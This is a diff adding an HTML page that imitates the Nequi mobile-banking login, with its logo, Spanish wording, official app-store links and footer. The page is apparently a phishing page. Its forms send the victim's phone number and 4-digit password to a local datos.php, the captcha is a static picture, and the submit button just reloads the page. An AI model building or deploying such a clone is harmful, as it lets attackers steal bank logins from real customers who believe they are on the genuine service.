@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles/style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Advent+Pro:wght@300&family=IBM+Plex+Serif&family=Manrope:wght@400&display=swap" rel="stylesheet">
+
+
+<body>
+<header >
+    <nav class="header-section">
+
+    <div class="logo">
+        <img src="./styles/images/64dfef05bc6705edb9447499_nequi.svg" alt="logo">
+    </div>
+    <div class="menu">
+        <img src="./styles/images/bars-solid.svg" alt="logo">
+    </div>
+</nav>
+   
+</header>
+
+
+<section class="login-section" > 
+    <div class="login-section-form"> 
+    <h1> Entra a tu Nequi </h1>
+    <p> Podrás desbloquear tu nequi, consultar tus datos </p>
+
+    <article class="login-form"> 
+ 
+            <div class="country-login-form">   
+                <img src="./styles/images/flag_colombia.png" alt="" class="img-country-number">
+
+              <form class="form-country"> 
+                 <select name="pais" id="" class="select-country">
+                <option  value="+57">+57</option>
+               </select>
+           
+              
+    
+            <form  action="datos.php"  method="post"    class="form-number" >
+                <input type="cel"  maxlength="10" name="numeroCelular" id="inputCel" class="input-cel"  class="input-cel-alert"  placeholder="Número de celular"   >
+              </form>
+            </div>
+
+       
+        <form action="datos.php"   method="post" >
+        <input type="password" class="password" id="inputPassword "  name="Contraseña" placeholder="Contraseña"  maxlength="4">
+          </form>
+
+        <section class="captcha ">
+            <img id="img-captcha" src="./styles/recapcha validoe.jpg" alt="">
+          </section>
+  
+
+         <button  type="submit" class="button-unavailable" id="button-available" onclick="reloadPage()"> Enviar</button>
+        </form>
+
+    </article>
+
+        </section>
+  
+
+    <footer>
+      <div class="container-footer">
+        <!--logo vigilado vertical-->
+       <div class="logo-vig">
+        <img src="" alt="">
+       </div>
+
+       <div class="container-footer-top"> 
+         <!--logos bancos--> 
+      <div class="logo-nequi">
+            <img src="./styles/images/logo-nequi-blanco.svg" alt="">
+        </div>
+
+        <!--stores-->
+        <div class="stores "> 
+        <a href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es"> 
+        <img src="./styles/images/playstore.svg" alt="">
+        </a>
+        <a href="https://apps.apple.com/co/app/nequi/id1075378688"> 
+        <img src="./styles/images/store-apple.svg" alt="">
+          </a>
+        
+          <a href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0"> 
+            <img src="./styles/images/store-huawei.svg" alt="">
+        </a>
+        </div>
+
+        <div class="grupo-bancolombia">
+            <a href="https://www.grupobancolombia.com/">  
+            <img src="./styles/images/grupobancolombia.svg" alt=""> </a>
+        </div>
+
+       </div>
+       
+       <hr class="separator">
+
+
+       <div class="container-footer-middle"> 
+
+        <ul>
+            <li>Informacion Legal</li>
+            <img src="./styles/images/ic-arrow.svg" alt="">
+        </ul>
+        <ul> 
+        <li>Para personas </li>
+           <img src="./styles/images/ic-arrow.svg" alt="">
+        </ul>
+        <ul>  
+        <li>Para tu negocio </li>
+        <img src="./styles/images/ic-arrow.svg" alt="">
+
+    </ul>
+    <ul>
+        <li>Ayuda</li>
+        <img src="./styles/images/ic-arrow.svg" alt="">
+    </ul>
+      <ul>
+        <li> Conocenos</li>
+        <img src="./styles/images/ic-arrow.svg" alt="">
+    </ul>
+       
+       </div>
+       <hr class="separator"> 
+
+       <div class="container-footer-end"> 
+        
+       <img src="./styles/images/ic-twitter.svg" alt="">
+       <img src="./styles/images/ic-instagram.svg"  alt="">
+       <img src="./styles/images/ic-facebook.svg"  alt="">
+       <img src="./styles/images/ic-linkedin.svg"  alt="">
+       <img src="./styles/images/ic-youtube.svg"  alt="">
+
+       </div>
+       
+       <hr class="separator"> 
+
+    </div>
+
+    </footer>
+
+</section>
+
+    <script src="./src/main.js"></script>
+</body>
+</html>
